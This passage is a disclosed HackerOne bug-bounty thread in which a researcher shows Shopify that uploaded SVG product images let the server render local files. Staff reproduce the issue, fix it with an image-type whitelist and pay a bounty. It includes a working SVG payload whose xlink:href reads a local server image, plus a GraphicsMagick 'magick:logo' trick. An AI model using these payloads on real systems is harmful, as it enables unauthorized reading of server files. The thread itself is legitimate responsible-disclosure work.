else.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T00:11:13.267Z","updated_at":"2015-11-04T00:17:01.064Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\r\n\r\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\r\n\r\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don\u0026#39;t worry, we\u0026#39;ll get to yours!\u003c/p\u003e\n\n\u003cp\u003eWhile you are waiting, you can read over our list of non applicable issues listed on our program page: \u003ca title=\"https://hackerone.com/shopify\" href=\"https://hackerone.com/shopify\"\u003ehttps://hackerone.com/shopify\u003c/a\u003e. Make sure your issue isn\u0026#39;t listed!\u003c/p\u003e\n","automated_response":true,"created_at":"2015-11-04T01:57:23.832Z","updated_at":"2015-11-04T01:57:23.832Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643913,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"I tested the steps you suggested and I cannot reproduce this issue. At this point, a video would help greatly so I can understand your testing method. Also please specify the name of  the store where you tested this issue from.","markdown_message":"\u003cp\u003eI tested the steps you suggested and I cannot reproduce this issue. At this point, a video would help greatly so I can understand your testing method. Also please specify the name of  the store where you tested this issue from.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T02:11:19.504Z","updated_at":"2015-11-04T02:11:19.504Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":643922,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"The store is https://whitehatgsl.myshopify.com \nThe product with google images was created using the above svg file.\n\nI'll make a video but could you specify what you cannot reproduce? Does the .svg file uploads?  Does it shows a black line img only without fetching the google part?\n\nIt works for me every time. You parser seems to break on minor svg changes, so please, check that the file you are using is the same I posted last. Also remember to save the product before uploading the svg.\n\nI'll get back with a vid, but might take some hours, if you could answer this before I would apreciate.","markdown_message":"\u003cp\u003eThe store is \u003ca title=\"https://whitehatgsl.myshopify.com\" href=\"/redirect?url=https%3A%2F%2Fwhitehatgsl.myshopify.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://whitehatgsl.myshopify.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003cbr\u003e\nThe product with google images was created using the above svg file.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll make a video but could you specify what you cannot reproduce? Does the .svg file uploads?  Does it shows a black line img only without fetching the google part?\u003c/p\u003e\n\n\u003cp\u003eIt works for me every time. You parser seems to break on minor svg changes, so please, check that the file you are using is the same I posted last. Also remember to save the product before uploading the svg.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll get back with a vid, but might take some hours, if you could answer this before I would apreciate.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T02:23:51.526Z","updated_at":"2015-11-04T02:23:51.526Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643925,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I get an error back from Shopify during the upload process (422), and I see no connection to the URL I specified. I used the last svg example you sent.","markdown_message":"\u003cp\u003eI get an error back from Shopify during the upload process (422), and I see no connection to the URL I specified. I used the last svg example you sent.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T02:26:22.814Z","updated_at":"2015-11-04T02:26:22.814Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":643927,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've got that 422 too, when testing other malformed svgs.  But the one posted above worked again right now. I'm guessin it might be a copy-paste on mac creating newlines chars I did not test. \n\nCould you please try sublime + ubuntu + chrome to perform the steps?\n\nI'll also place a copy of the exact svg on my store files so you can try it instead of creating your own:\nhttps://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg\n","markdown_message":"\u003cp\u003eI\u0026#39;ve got that 422 too, when testing other malformed svgs.  But the one posted above worked again right now. I\u0026#39;m guessin it might be a copy-paste on mac creating newlines chars I did not test. \u003c/p\u003e\n\n\u003cp\u003eCould you please try sublime + ubuntu + chrome to perform the steps?\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll also place a copy of the exact svg on my store files so you can try it instead of creating your own:\u003cbr\u003e\n\u003ca title=\"https://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F1046%2F6164%2Ffiles%2FminimalGoogleLoad.svg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T02:38:11.658Z","updated_at":"2015-11-04T02:38:11.658Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643969,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is the video I made for you:\n\nhttps://drive.google.com/file/d/0B92V0Fvc4gjYTndYTUdRZ0JoTGM/view?usp=sharing\n\nLet me know when you have it to take down the link asap.\n\nAlso, excuse me for butchering your name. I hope my english is clear enough.","markdown_message":"\u003cp\u003eHere is the video I made for you:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://drive.google.com/file/d/0B92V0Fvc4gjYTndYTUdRZ0JoTGM/view?usp=sharing\" href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F0B92V0Fvc4gjYTndYTUdRZ0JoTGM%2Fview%3Fusp%3Dsharing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://drive.google.com/file/d/0B92V0Fvc4gjYTndYTUdRZ0JoTGM/view?usp=sharing\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLet me know when you have it to take down the link asap.\u003c/p\u003e\n\n\u003cp\u003eAlso, excuse me for butchering your name. I hope my english is clear enough.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T03:50:04.755Z","updated_at":"2015-11-04T03:50:04.755Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":645550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I downloaded the video, so you can delete it. It may take until next week for me to get back to this issue, sorry for the delay.","markdown_message":"\u003cp\u003eI downloaded the video, so you can delete it. It may take until next week for me to get back to this issue, sorry for the delay.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-04T17:58:32.037Z","updated_at":"2015-11-04T17:58:32.037Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":646263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I want to add another, more significant, proof of concept.\n\nYou can actually __read images from the local system__ using this method. Change the href to the following `/lib/plymouth/ubuntu_logo.png`\nThat will load a local file from your server that I can see.\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\n   xmlns=\"http://www.w3.org/2000/svg\"\n   xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n   style=\"overflow: hidden; position: relative;\"\n   width=\"300\"\n   height=\"200\"\u003e\n\n  \u003cimage\n     x=\"10\"\n     y=\"10\"\n     width=\"276\"\n     height=\"110\"\n     xlink:href=\"/lib/plymouth/ubuntu_logo.png\"\n     stroke-width=\"1\"/\u003e\n  \u003crect\n     x=\"0\"\n     y=\"150\"\n     height=\"10\"\n     width=\"300\"\n     style=\"fill: black\"/\u003e\n\u003c/svg\u003e\n```\n\nHere it is a screenshot on how that .svg file renders after uploading:\nhttps://drive.google.com/file/d/0B92V0Fvc4gjYLUdFSmlsTThLQTA\n","markdown_message":"\u003cp\u003eI want to add another, more significant, proof of concept.\u003c/p\u003e\n\n\u003cp\u003eYou can actually \u003cstrong\u003eread images from the local system\u003c/strong\u003e using this method. Change the href to the following \u003ccode\u003e/lib/plymouth/ubuntu_logo.png\u003c/code\u003e\u003cbr\u003e\nThat will load a local file from your server that I can see.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;overflow: hidden; position: relative;\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;300\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;276\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;110\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/lib/plymouth/ubuntu_logo.png\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estroke-width=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;rect\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;150\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;300\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fill: black\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere it is a screenshot on how that .svg file renders after uploading:\u003cbr\u003e\n\u003ca title=\"https://drive.google.com/file/d/0B92V0Fvc4gjYLUdFSmlsTThLQTA\" href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F0B92V0Fvc4gjYLUdFSmlsTThLQTA\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://drive.google.com/file/d/0B92V0Fvc4gjYLUdFSmlsTThLQTA\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-05T04:00:17.581Z","updated_at":"2015-11-05T04:00:17.581Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":646931,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the video, I managed to reproduce using the example you uploaded at https://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg. I'm not sure why I had a 422 response before, I suspect markdown is changing the formatting and copy/pasting the xml from your comment didn't work.","markdown_message":"\u003cp\u003eThanks for the video, I managed to reproduce using the example you uploaded at \u003ca title=\"https://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F1046%2F6164%2Ffiles%2FminimalGoogleLoad.svg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. I\u0026#39;m not sure why I had a 422 response before, I suspect markdown is changing the formatting and copy/pasting the xml from your comment didn\u0026#39;t work.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-05T16:58:49.489Z","updated_at":"2015-11-05T16:58:49.489Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":651438,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I opened an issue for our engineering team and we'll look into the best way of fixing this. Thank you for bringing the issue to our attention!","markdown_message":"\u003cp\u003eI opened an issue for our engineering team and we\u0026#39;ll look into the best way of fixing this. Thank you for bringing the issue to our attention!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-09T18:50:28.930Z","updated_at":"2015-11-09T18:50:28.930Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":651898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Glad to help.\n\nDuring my research on this .svg vector I found two resources with on-spot information. A paper and a slide presentation that might help you too. They both include defense strategies, even for ruby stacks.\n\nhttp://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf\nhttps://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf\n\nBtw, easter egg. If you change the `xlink` to `magick:logo` so it reads `xlink:href=\"magick:logo\"` the server will output the GraphicsMagick frog logo that you use over there. I even thought to american-fuzzy-lop the svg parser lib ;)","markdown_message":"\u003cp\u003eGlad to help.\u003c/p\u003e\n\n\u003cp\u003eDuring my research on this .svg vector I found two resources with on-spot information. A paper and a slide presentation that might help you too. They both include defense strategies, even for ruby stacks.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf\" href=\"/redirect?url=http%3A%2F%2Fwww.vsecurity.com%2Fdownload%2Fpapers%2FXMLDTDEntityAttacks.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Fimages%2F0%2F03%2FMario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBtw, easter egg. If you change the \u003ccode\u003exlink\u003c/code\u003e to \u003ccode\u003emagick:logo\u003c/code\u003e so it reads \u003ccode\u003exlink:href=\u0026quot;magick:logo\u0026quot;\u003c/code\u003e the server will output the GraphicsMagick frog logo that you use over there. I even thought to american-fuzzy-lop the svg parser lib ;)\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-10T00:58:37.289Z","updated_at":"2015-11-10T00:58:37.289Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":706656,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. It's been a month. Any updates?","markdown_message":"\u003cp\u003eHi. It\u0026#39;s been a month. Any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-03T00:27:25.939Z","updated_at":"2015-12-03T00:27:25.939Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":707501,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We are still investigating this and will get back to you when we have something more to report. Thank you for your patience.","markdown_message":"\u003cp\u003eWe are still investigating this and will get back to you when we have something more to report. Thank you for your patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-03T17:39:52.882Z","updated_at":"2015-12-03T17:39:52.882Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":982015,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report.\n\nWe have resolved this issue by adding additional input validation to limit image attachments to a white list of acceptable image types.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report.\u003c/p\u003e\n\n\u003cp\u003eWe have resolved this issue by adding additional input validation to limit image attachments to a white list of acceptable image types.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-24T20:02:17.487Z","updated_at":"2016-05-24T20:02:17.487Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ogig","url":"/ogig"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":993270,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify. This issue has been resolved.","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify. This issue has been resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-31T18:27:02.025Z","updated_at":"2016-05-31T18:27:02.025Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"ogig","url":"/ogig"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":993271,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-31T18:27:11.233Z","updated_at":"2016-05-31T18:27:11.233Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":994400,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty.","markdown_message":"\u003cp\u003eThanks for the bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T06:26:59.448Z","updated_at":"2016-06-01T06:26:59.448Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":996554,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-02T12:57:43.946Z","updated_at":"2016-06-02T12:57:43.946Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":996555,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-02T12:57:44.051Z","updated_at":"2016-06-02T12:57:44.051Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}